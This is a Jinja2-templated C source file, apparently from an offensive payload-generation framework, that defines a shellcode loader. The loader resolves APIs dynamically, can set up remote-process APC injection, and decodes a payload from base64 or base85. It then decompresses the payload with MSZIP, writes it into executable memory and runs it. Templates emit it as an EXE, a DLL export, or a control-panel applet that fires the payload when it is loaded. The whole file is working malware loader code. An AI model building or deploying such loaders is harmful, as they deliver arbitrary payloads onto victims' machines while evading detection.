// --- Main Logic ---
void Run() {
    unsigned char* initial_data = NULL;
    DWORD initial_len = 0;
    unsigned char* current_data = NULL;
    size_t current_len = 0;
    unsigned char* decoded_data = NULL;
    size_t decoded_len = 0;
    unsigned char* decompressed_data = NULL;
    size_t decompressed_len = 0;
    void* exec_memory_block = NULL;

    ResolveAPIs();

    // --- STAGE 1: PREPARATION ---

    {% if guardrails_needed %}
    if (!RunGuardrails()) {
        DEBUG_PRINT("Run: Guardrails failed. Terminating.");
        return;
    }
    {% endif %}
    
    // --- STAGE 2: CONTEXT ---
    HANDLE hTargetProcess = (HANDLE)-1; // we're defaulting to Local
    HANDLE hTargetThread = NULL;
    HANDLE hJob = NULL;

    {% if execution_method == 'remoteapc' %}
        {% include 'partials/setup_remote_spawn.c.j2' %}
        if (hTargetProcess == NULL) {
            DEBUG_PRINT("Run: Failed to setup remote process context.");
            return;
        }
    {% endif %}

    if (!LoadData(&initial_data, &initial_len)) {
        DEBUG_PRINT("Run: Failed to load initial data");
        return;
    }

    {% if debug_mode %}
    DWORD loaded_hash = djb2_hash_bytes(initial_data, initial_len);
    DEBUG_PRINT("Run: Data loaded. Size: %lu, Hash: 0x%08X", initial_len, loaded_hash);
    {% endif %}

    current_data = initial_data;
    current_len = initial_len;
    
    {% if bytecode_transformation == 'base64_encoder' %}
        decoded_len = (current_len / 4) * 3 + 4;
        decoded_data = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_len);
        Base64Decode(current_data, current_len, decoded_data, &decoded_len);
        DEBUG_PRINT("Run: Base64 decoded payload");
        current_data = decoded_data;
        current_len = decoded_len;

    {% elif bytecode_transformation == 'base85_encoder' %}
        decoded_len = (current_len / 5) * 4 + 4;
        decoded_data = (unsigned char*)pfnHeapAlloc(pfnGetProcessHeap(), 0, decoded_len);
        Base85Decode(current_data, current_len, decoded_data, &decoded_len);
        DEBUG_PRINT("Run: Base85 decoded payload");
        current_data = decoded_data;
        current_len = decoded_len;
    {% endif %}

    {% if bytecode_compression == 'mszip_compressor' %}
        decompressed_data = MszipDecompress(current_data, current_len, &decompressed_len);
        if (decompressed_data == NULL) {
            DEBUG_PRINT("Run: MSZIP decompression failed!");
            if (decoded_data != NULL) pfnHeapFree(pfnGetProcessHeap(), 0, decoded_data);
            return;
        }
        DEBUG_PRINT("Run: MSZIP decompressed payload");
        current_data = decompressed_data;
        current_len = decompressed_len;
    {% endif %}

    // Execution
    exec_memory_block = AllocateExecutableMemory(hTargetProcess, current_len);
    if (exec_memory_block) {
        WritePayload(hTargetProcess, exec_memory_block, current_data, current_len);
    }
    ExecutePayload(exec_memory_block, current_data, current_len, hTargetProcess, hTargetThread, hJob);

    // Cleanup goes here
    if (initial_data != NULL) {
        {% if data_source == 'file' %}
        pfnHeapFree(pfnGetProcessHeap(), 0, initial_data);
        DEBUG_PRINT("Run: Freed memory from data loader.");
        {% endif %}
    }
    if (decoded_data != NULL) {
        pfnHeapFree(pfnGetProcessHeap(), 0, decoded_data);
        DEBUG_PRINT("Run: Freed memory from decoding buffer.");
    }
    if (decompressed_data != NULL) {
        pfnHeapFree(pfnGetProcessHeap(), 0, decompressed_data);
        DEBUG_PRINT("Run: Freed memory from decompression buffer.");
    }

}

// --- Entry Point (EXE, DLL or CPL) ---
{% if output_format == 'dll' %}
void WINAPI {{ export_name }}() {
    Run();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        g_hModule = hinstDLL;
    }
    return TRUE;
}

{% elif output_format == 'cpl' %}
#define CPL_INIT 1

LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2) {
    if (uMsg == CPL_INIT) {
        Run();
        return 1;
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) { 
        g_hModule = hinstDLL;
    }
    return TRUE;
}

{% else %}
int main(int argc, char *argv[]) {
    Run();
    return 0;
}
{% endif %}
